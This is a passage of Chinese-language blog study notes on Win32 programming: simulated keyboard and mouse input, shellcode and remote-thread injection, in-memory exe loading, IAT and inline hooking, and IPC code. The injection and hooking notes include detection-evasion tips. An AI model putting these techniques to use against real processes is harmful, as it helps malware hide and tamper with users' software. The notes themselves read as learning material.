class=\"line\"><span class=\"keyword\">else</span>\t</span><br><span class=\"line\">&#123;\t</span><br><span class=\"line\">\t::MessageBox(<span class=\"literal\">NULL</span>,TEXT(<span class=\"string\">&quot;窗口没有找到&quot;</span>),TEXT(<span class=\"string\">&quot;[ERROR]&quot;</span>),MB_OK);</span><br><span class=\"line\">&#125;\t</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">模拟键盘点击(搜索：键盘键与虚拟键码对照表)\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">TCHAR szTitle[MAX_PATH] = &#123;<span class=\"number\">0</span>&#125;;\t</span><br><span class=\"line\">RECT r;\t</span><br><span class=\"line\">HWND hwnd = ::FindWindow(TEXT(<span class=\"string\">&quot;#32770&quot;</span>),TEXT(<span class=\"string\">&quot;飞鸽传书  IP Messenger&quot;</span>));\t</span><br><span class=\"line\"><span class=\"keyword\">if</span>(hwnd != <span class=\"literal\">NULL</span>)\t</span><br><span class=\"line\">&#123;\t</span><br><span class=\"line\">\t<span class=\"comment\">//HWND hButton = FindWindowEx(hwnd,NULL,&quot;Button&quot;,&quot;刷新(&amp;R)&quot;);</span></span><br><span class=\"line\">\tHWND hEdit =::GetDlgItem(hwnd,<span class=\"number\">0x3E9</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">//获取窗口坐标</span></span><br><span class=\"line\">\t::GetWindowRect(hEdit,&amp;r);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">//设置鼠标的位置</span></span><br><span class=\"line\">\t::SetCursorPos(r.left+<span class=\"number\">1</span>,r.top+<span class=\"number\">1</span>);</span><br><span class=\"line\">\tSleep(<span class=\"number\">1000</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">//鼠标左键单击</span></span><br><span class=\"line\">\tmouse_event(MOUSEEVENTF_LEFTDOWN,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>);<span class=\"comment\">//点下左键 </span></span><br><span class=\"line\">\tmouse_event(MOUSEEVENTF_LEFTUP,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>);<span class=\"comment\">//松开左键</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">//模拟键盘</span></span><br><span class=\"line\">\tkeybd_event(<span class=\"number\">97</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">\tkeybd_event(<span class=\"number\">97</span>,<span class=\"number\">0</span>,KEYEVENTF_KEYUP,<span class=\"number\">0</span>);</span><br><span class=\"line\">\tSleep(<span class=\"number\">1000</span>);</span><br><span class=\"line\">\tkeybd_event(<span class=\"number\">66</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">\tkeybd_event(<span class=\"number\">66</span>,<span class=\"number\">0</span>,KEYEVENTF_KEYUP,<span class=\"number\">0</span>);</span><br><span class=\"line\">\tSleep(<span class=\"number\">1000</span>);</span><br><span class=\"line\">\tkeybd_event(<span class=\"number\">16</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">\tkeybd_event(<span class=\"number\">67</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">\tkeybd_event(<span class=\"number\">67</span>,<span class=\"number\">0</span>,KEYEVENTF_KEYUP,<span class=\"number\">0</span>);</span><br><span class=\"line\">\tkeybd_event(<span class=\"number\">16</span>,<span class=\"number\">0</span>,KEYEVENTF_KEYUP,<span class=\"number\">0</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">&#125;\t</span><br><span class=\"line\"><span class=\"keyword\">else</span>\t</span><br><span class=\"line\">&#123;\t</span><br><span class=\"line\">\t::MessageBox(<span class=\"literal\">NULL</span>,TEXT(<span class=\"string\">&quot;窗口没有找到&quot;</span>),TEXT(<span class=\"string\">&quot;[ERROR]&quot;</span>),MB_OK);</span><br><span class=\"line\">&#125;\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"shellcode-远程注入\"><a class=\"markdownIt-Anchor\" href=\"#shellcode-远程注入\">#</a> shellcode 远程注入</h3>\n<p>1.hook</p>\n<p>2.createremotethread</p>\n<p>代码注入</p>\n<p>硬编码转 shellcode  不要使用 iat   不要使用全局变量  难被检测</p>\n<p>模块注入</p>\n<p>不需要改代码，特征明显</p>\n<p>远程注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//1.加载DLL\t\t\t\t\t</span><br><span class=\"line\">HINSTANCE   hModule = LoadLibrary(&quot;InjectDll.dll&quot;); \t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">//2.释放DLL\t\t\t\t\t</span><br><span class=\"line\">FreeLibrary(hModule);\t\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HANDLE WINAPI CreateThread(\t\t\t\t\t\t</span><br><span class=\"line\">    LPSECURITY_ATTRIBUTES lpThreadAttributes,\t\t\t\t\t\t</span><br><span class=\"line\">    SIZE_T dwStackSize,\t\t\t\t\t\t</span><br><span class=\"line\">    LPTHREAD_START_ROUTINE lpStartAddress,\t\t\t\t\t\t</span><br><span class=\"line\">    LPVOID lpParameter,\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD dwCreationFlags,\t\t\t\t\t\t</span><br><span class=\"line\">    PDWORD lpThreadId\t\t\t\t\t\t</span><br><span class=\"line\">    );\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">HANDLE WINAPI CreateRemoteThread(\t\t\t\t\t\t</span><br><span class=\"line\">    HANDLE hProcess,\t\t\t\t\t\t</span><br><span class=\"line\">    LPSECURITY_ATTRIBUTES lpThreadAttributes,\t\t\t\t\t\t</span><br><span class=\"line\">    SIZE_T dwStackSize,\t\t\t\t\t\t</span><br><span class=\"line\">    LPTHREAD_START_ROUTINE lpStartAddress,\t\t\t\t\t\t</span><br><span class=\"line\">    LPVOID lpParameter,\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD dwCreationFlags,\t\t\t\t\t\t</span><br><span class=\"line\">    LPDWORD lpThreadId\t\t\t\t\t\t</span><br><span class=\"line\">    );\t\t\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"内存注入\"><a class=\"markdownIt-Anchor\" href=\"#内存注入\">#</a> 内存注入</h3>\n<p>把 exe 扔到自己的数据区里，实现注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">步骤：\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">1、将自己进程的ImageBase设置一个较大的值，让自己的程序在高空运行.\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">2、将要执行的进程读取进来，按照进程的ImageBase和SizeOfImage分配空间\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">3、拉伸进程\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">4、修复IAT表\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">5、跳转到入口执行\t\t\t\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230913210303051.png\" alt=\"image-20230913210303051\"></p>\n<h3 id=\"内存写入\"><a class=\"markdownIt-Anchor\" href=\"#内存写入\">#</a> 内存写入</h3>\n<p>进程 A 只知道有进程写了自己的进程。但不知道是谁写的，写了什么。</p>\n<p>相比注入，这个在进程的模块中是找不到的。</p>\n<p>exe 扔到 exe 里～</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230915201756113.png\" alt=\"image-20230915201756113\"></p>\n<p>虽然已经修复了重定位表，IAT 会修复一部分。比如 [412345]  会被重定位修复后变为 [512345]</p>\n<p>但是 [ ]  得出的值会变，即 api 地址发生变化。而且两个进程加载的 dll 不一定一样。</p>\n<p>还需要将 [512345] 算出的值变为进程 A 中的 dll 的地址</p>\n<h3 id=\"hook\"><a class=\"markdownIt-Anchor\" href=\"#hook\">#</a> hook</h3>\n<p>hook 修改</p>\n<p>1. 监控：可以获取原来的函数参数和返回值</p>\n<p>2. 改行为</p>\n<h4 id=\"iat-hook\"><a class=\"markdownIt-Anchor\" href=\"#iat-hook\">#</a> IAT hook</h4>\n<p>更改 [x]  == y  中 y 改成自己的函数的地址</p>\n<p>注意函数改之后不能破环堆栈平衡</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230915213752344.png\" alt=\"image-20230915213752344\"></p>\n<p>IAT hook 完之后需要改回来</p>\n<p>自己使用 getprocaddress (loadlibrary ()) 加载的不在 iat 里面。或者自己写的函数</p>\n<h3 id=\"inline-hook\"><a class=\"markdownIt-Anchor\" href=\"#inline-hook\">#</a> inline hook</h3>\n<p>jmp 走 再跳回来。跳回来之前需要把我们改的代码贴到我们的代码中</p>\n<p>我们的代码执行前需要保存原来寄存器的值 pushad  popad</p>\n<p>还需要保证堆栈平衡，jmp 之前堆栈一定要和原来一样</p>\n<p>同时不能修改原来堆栈的值，或者改完能然程序不崩溃</p>\n<p>还需要注意线程安全</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pushad</span><br><span class=\"line\">pushfd</span><br><span class=\"line\">push xxx</span><br><span class=\"line\">...</span><br><span class=\"line\">...</span><br><span class=\"line\">pop xxx</span><br><span class=\"line\">popfd</span><br><span class=\"line\">popad </span><br><span class=\"line\">原来被我们改的代码</span><br><span class=\"line\">jmp</span><br></pre></td></tr></table></figure>\n<p>可以不使用 jmp，使用 call，ret，堆栈会自己平衡</p>\n<p>不一定非要五个字节，可以 &gt;=5 ，多出来的 nop</p>\n<p>hook 后可以读取当前执行环境寄存器的值或者堆栈中的数据</p>\n<p>所有 hook 都需要卸载</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230916170113026.png\" alt=\"image-20230916170113026\"></p>\n<h3 id=\"进程通信\"><a class=\"markdownIt-Anchor\" href=\"#进程通信\">#</a> 进程通信</h3>\n<h4 id=\"自定义消息\"><a class=\"markdownIt-Anchor\" href=\"#自定义消息\">#</a> 自定义消息</h4>\n<p>B 进程控制 A 进程窗口，send /post message</p>\n<p>SendMessage  不进入对方消息队列</p>\n<p>PostMessage  进入对方消息队列</p>\n<p>WM_USER 0x400     // 系统消息 &lt;0x400 ，自定义消息需要&gt; 0x400</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">发送端代码：\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">HWND hwnd = ::<span class=\"built_in\">FindWindow</span>(<span class=\"literal\">NULL</span>,<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;接收端窗口名&quot;</span>));\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">if</span>(hwnd == <span class=\"literal\">NULL</span>)\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"built_in\">MessageBox</span>(<span class=\"number\">0</span>,<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;没找到窗口&quot;</span>),<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;ERROR&quot;</span>),MB_OK);\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">else</span>\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">// 发送消息  \t\t\t\t\t\t</span></span><br><span class=\"line\">\t<span class=\"comment\">//SendMessage(hwnd,WM_USER+0x1,NULL, (LPARAM)100); \t\t\t\t\t\t</span></span><br><span class=\"line\">\t<span class=\"built_in\">PostMessage</span>(hwnd,WM_USER+<span class=\"number\">0x1</span>, <span class=\"literal\">NULL</span>, (LPARAM)<span class=\"number\">100</span>);\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">接收端代码：\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">switch</span>(uMsg)\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">case</span> WM_CLOSE:\t\t\t\t\t\t\t</span><br><span class=\"line\">\t&#123;\t\t\t\t\t\t</span><br><span class=\"line\">\t\t<span class=\"built_in\">EndDialog</span>(hDlg,<span class=\"number\">0</span>);\t\t\t\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span>;\t\t\t\t\t</span><br><span class=\"line\">\t&#125;\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">case</span> WM_USER+<span class=\"number\">0x1</span>:\t\t\t\t\t\t\t</span><br><span class=\"line\">\t&#123;\t\t\t\t\t\t</span><br><span class=\"line\">\t\tDWORD x = wParam;\t\t\t\t\t</span><br><span class=\"line\">\t\tDWORD y = lParam;\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t<span class=\"built_in\">MessageBox</span>(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>);\t\t\t\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span>;\t\t\t\t\t</span><br><span class=\"line\">\t&#125;\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">case</span> WM_COMMAND:\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">switch</span> (<span class=\"built_in\">LOWORD</span> (wParam))\t\t\t\t\t\t</span><br><span class=\"line\">\t&#123;\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> IDC_BUTTON_RECV:\t\t\t\t\t\t</span><br><span class=\"line\">\t\t&#123;\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> TRUE;\t\t\t\t</span><br><span class=\"line\">\t\t&#125;\t\t\t\t\t</span><br><span class=\"line\">\t&#125;\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">break</span> ;\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"共享内存\"><a class=\"markdownIt-Anchor\" href=\"#共享内存\">#</a> 共享内存</h4>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 发送端代码：\t\t\t\t\t</span></span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">HANDLE hMapObject;\t\t\t\t\t</span><br><span class=\"line\">HANDLE hMapView;\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\"><span class=\"comment\">//创建FileMapping对象\t\t\t\t\t</span></span><br><span class=\"line\">hMapObject = <span class=\"built_in\">CreateFileMapping</span>((HANDLE)<span class=\"number\">0xFFFFFFFF</span>,<span class=\"literal\">NULL</span>,PAGE_READWRITE,<span class=\"number\">0</span>,<span class=\"number\">0x1000</span>,<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;shared&quot;</span>));\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!hMapObject)\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"built_in\">MessageBox</span>(<span class=\"literal\">NULL</span>,<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;共享内存失败&quot;</span>),<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;Error&quot;</span>),MB_OK);\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> FALSE;\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t</span><br><span class=\"line\"><span class=\"comment\">//将FileMapping对象映射到自己的进程\t\t\t\t\t</span></span><br><span class=\"line\">hMapView = <span class=\"built_in\">MapViewOfFile</span>(hMapObject,FILE_MAP_WRITE,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>);\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!hMapView)\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"built_in\">MessageBox</span>(<span class=\"literal\">NULL</span>,<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;内存映射失败&quot;</span>),<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;Error&quot;</span>),MB_OK);\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> FALSE;\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t</span><br><span class=\"line\"><span class=\"comment\">//向共享内存写入数据\t\t\t\t\t</span></span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>((<span class=\"type\">char</span>*)hMapView,<span class=\"string\">&quot;Test Shared Memery&quot;</span>);\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\"><span class=\"comment\">// 接收端代码：\t\t\t\t\t</span></span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">HANDLE hMapObject;\t\t\t\t\t</span><br><span class=\"line\">HANDLE hMapView;\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\"><span class=\"comment\">//创建FileMapping对象\t\t\t\t\t</span></span><br><span class=\"line\">hMapObject = <span class=\"built_in\">CreateFileMapping</span>((HANDLE)<span class=\"number\">0xFFFFFFFF</span>,<span class=\"literal\">NULL</span>,PAGE_READWRITE,<span class=\"number\">0</span>,<span class=\"number\">0x1000</span>,<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;shared&quot;</span>));\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!hMapObject)\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"built_in\">MessageBox</span>(<span class=\"literal\">NULL</span>,<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;共享内存失败&quot;</span>),<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;Error&quot;</span>),MB_OK);\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> FALSE;\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t</span><br><span class=\"line\"><span class=\"comment\">//将FileMapping对象映射到自己的进程\t\t\t\t\t</span></span><br><span class=\"line\">hMapView = <span class=\"built_in\">MapViewOfFile</span>(hMapObject,FILE_MAP_WRITE,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>);\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!hMapView)\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"built_in\">MessageBox</span>(<span class=\"literal\">NULL</span>,<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;内存映射失败&quot;</span>),<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;Error&quot;</span>),MB_OK);\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> FALSE;\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t</span><br><span class=\"line\"><span class=\"comment\">//从共享内存读取数据\t\t\t\t\t</span></span><br><span class=\"line\">TCHAR szBuffer[<span class=\"number\">0x1000</span>] = &#123;<span class=\"number\">0</span>&#125;;\t\t\t\t\t</span><br><span class=\"line\"><span class=\"built_in\">memcpy</span>(szBuffer,hMapView,<span class=\"number\">10</span>);\t\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"匿名管道\"><a class=\"markdownIt-Anchor\" href=\"#匿名管道\">#</a> 匿名管道</h4>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">父进程：\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">HANDLE hRead;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">HANDLE hWrite;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">SECURITY_ATTRIBUTES sa;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">sa.bInheritHandle = TRUE;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">sa.lpSecurityDescriptor = <span class=\"literal\">NULL</span>;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">sa.nLength = <span class=\"built_in\">sizeof</span>(SECURITY_ATTRIBUTES);\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"built_in\">CreatePipe</span>(&amp;hRead,&amp;hWrite,&amp;sa,<span class=\"number\">0</span>))\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"built_in\">MessageBox</span>(<span class=\"number\">0</span>,<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;创建匿名管道失败!&quot;</span>),<span class=\"built_in\">TEXT</span>(<span 